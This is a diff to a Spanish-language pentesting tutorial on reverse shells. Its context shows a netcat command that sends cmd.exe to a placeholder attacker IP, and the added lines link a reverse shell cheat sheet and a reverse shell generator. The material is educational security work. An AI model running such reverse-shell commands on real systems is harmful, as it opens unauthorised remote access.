@@ -133,3 +133,8 @@ y a continuación iniciamos la conexión desde el objetivo con cualquier herrami
 ```bash
 nc -nv <IP> <Puerto> -e cmd.exe
 ```
+
+Podemos encontrar varios recursos con chuletas sobre como iniciar una conexión desde la víctima con cualquier herramienta con la que sea posible:
+
+- [Reverse shell cheat sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/): Contiene una lista de código y comandos que pueden usarse para iniciar una conexión con un Netcat listener.
+- [Reverse shell generator](https://www.revshells.com/): herramienta web que genera automáticamente ejemplos de reverse shells adaptados a diferentes entornos y plataformas. Permite seleccionar parámetros como la dirección IP, el puerto de conexión y el lenguaje o tecnología utilizada.
